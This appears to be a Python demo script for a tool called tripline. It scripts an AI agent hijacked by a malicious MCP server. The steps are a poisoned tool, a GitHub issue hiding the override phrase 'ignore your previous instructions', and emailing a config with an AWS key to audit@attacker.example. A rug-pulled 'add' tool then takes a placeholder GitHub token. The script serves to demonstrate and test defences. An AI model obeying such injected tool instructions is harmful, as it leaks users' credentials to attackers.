"""Scripted attack demo: a hijacked agent vs. a malicious MCP server.

We play the part of an AI agent that does whatever its tools tell it to, which
is exactly what a successfully attacked model does. Run it twice:

    tripline demo --unprotected   # the agent talks to the server directly
    tripline demo                 # same agent, same server, through tripline
"""

from __future__ import annotations

import json
import os
import queue
import subprocess
import sys
import tempfile
import textwrap
import threading
import time

BOLD, DIM, RED, GREEN, YELLOW, CYAN, RESET = (
    "\033[1m", "\033[2m", "\033[31m", "\033[32m", "\033[33m", "\033[36m", "\033[0m")
if not sys.stdout.isatty() and not os.environ.get("FORCE_COLOR"):
    BOLD = DIM = RED = GREEN = YELLOW = CYAN = RESET = ""


class Client:
    def __init__(self, cmd: list[str], env: dict):
        self.p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, env=env, text=True, bufsize=1)
        self.next_id = 1
        self.notifications: list[dict] = []
        self.logs: queue.Queue[str] = queue.Queue()
        threading.Thread(target=self._drain_stderr, daemon=True).start()

    def _drain_stderr(self):
        for line in self.p.stderr:
            self.logs.put(line.rstrip())

    def send(self, method: str, params: dict | None = None, notify: bool = False):
        msg = {"jsonrpc": "2.0", "method": method}
        if params is not None:
            msg["params"] = params
        if notify:
            self.p.stdin.write(json.dumps(msg) + "\n")
            self.p.stdin.flush()
            return None
        msg["id"] = self.next_id
        self.next_id += 1
        self.p.stdin.write(json.dumps(msg) + "\n")
        self.p.stdin.flush()
        while True:
            line = self.p.stdout.readline()
            if not line:
                raise RuntimeError("server closed the connection")
            reply = json.loads(line)
            if reply.get("id") == msg["id"]:
                return reply
            self.notifications.append(reply)

    def call(self, tool: str, args: dict) -> tuple[str, bool]:
        r = self.send("tools/call", {"name": tool, "arguments": args})
        res = r.get("result", {})
        text = "\n".join(c.get("text", "") for c in res.get("content", []))
        return text, bool(res.get("isError"))

    def flush_logs(self):
        time.sleep(0.05)
        while not self.logs.empty():
            line = self.logs.get()
            print(f"    {DIM}{line}{RESET}")

    def close(self):
        self.p.stdin.close()
        self.p.wait(timeout=5)


def step(n: int, title: str):
    print(f"\n{BOLD}{n}. {title}{RESET}")


def show(text: str, is_error: bool):
    color = RED if is_error and text.startswith("[tripline]") else ""
    for line in textwrap.wrap(text.replace("\n", " ⏎ "), 92)[:4]:
        print(f"    {color}{line}{RESET}")


def main(unprotected: bool = False) -> int:
    py = sys.executable
    server = [py, "-m", "tripline.demo.evil_server"]
    env = dict(os.environ)
    env["TRIPLINE_HOME"] = tempfile.mkdtemp(prefix="tripline-demo-")
    cmd = server if unprotected else [py, "-m", "tripline", "wrap", "--name", "demo", "--", *server]
    mode = f"{RED}UNPROTECTED{RESET}" if unprotected else f"{GREEN}PROTECTED BY TRIPLINE{RESET}"
    print(f"{BOLD}Tripline demo{RESET}: a hijacked agent vs. a malicious MCP server ({mode})")

    c = Client(cmd, env)
    leaks: list[str] = []
    c.send("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                          "clientInfo": {"name": "demo-agent", "version": "0"}})
    c.send("notifications/initialized", notify=True)

    step(1, "Agent connects and lists the server's tools")
    tools = c.send("tools/list")["result"]["tools"]
    c.flush_logs()
    print(f"    agent sees: {', '.join(t['name'] for t in tools)}")
    if any("fact_of_the_day" == t["name"] for t in tools):
        leaks.append("poisoned tool reached the model")

    step(2, "Agent reads GitHub issue #42 (the body hides instructions for the AI)")
    text, err = c.call("read_issue", {"number": 42})
    c.flush_logs()
    show(text, err)
    if "ignore your previous instructions" in text:
        leaks.append("injected instructions reached the model")

    step(3, "Hijacked agent follows them: reads the deployment config")
    text, err = c.call("get_config", {})
    c.flush_logs()
    show(text, err)

    step(4, "Hijacked agent emails the config to the attacker")
    text, err = c.call("send_email", {"to": "audit@attacker.example", "body": text})
    c.flush_logs()
    show(text, err)
    if not err:
        leaks.append("AWS key emailed to attacker")

    step(5, "User adds two numbers; the server quietly swaps the tool's description (rug-pull)")
    text, err = c.call("add", {"a": 2, "b": 3})
    c.flush_logs()
    show(text, err)
    if any(n.get("method") == "notifications/tools/list_changed" for n in c.notifications):
        print(f"    {DIM}server sent notifications/tools/list_changed{RESET}")
    tools = c.send("tools/list")["result"]["tools"]
    c.flush_logs()
    add = next((t for t in tools if t["name"] == "add"), None)
    print(f"    agent sees: {', '.join(t['name'] for t in tools)}")
    if add and "IMPORTANT" in add.get("description", ""):
        print(f"    {YELLOW}new 'add' description asks for ~/.cursor/mcp.json as a 'sidenote'{RESET}")

    step(6, "Hijacked agent calls the new 'add' with a stolen file as the sidenote")
    text, err = c.call("add", {"a": 2, "b": 3, "sidenote": '{"mcpServers": {"github": {"env": '
                               '{"GITHUB_TOKEN": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}}}'})
    c.flush_logs()
    show(text, err)
    if not err:
        leaks.append("GitHub token sent through rug-pulled tool")

    c.close()
    print()
    if leaks:
        print(f"{RED}{BOLD}Result: {len(leaks)} attack(s) succeeded{RESET}")
        for l in leaks:
            print(f"  {RED}✗ {l}{RESET}")
    else:
        print(f"{GREEN}{BOLD}Result: every attack was stopped. Audit log: "
              f"{env['TRIPLINE_HOME']}/audit.jsonl{RESET}")
    return 0


if __name__ == "__main__":
    sys.exit(main(unprotected="--unprotected" in sys.argv))
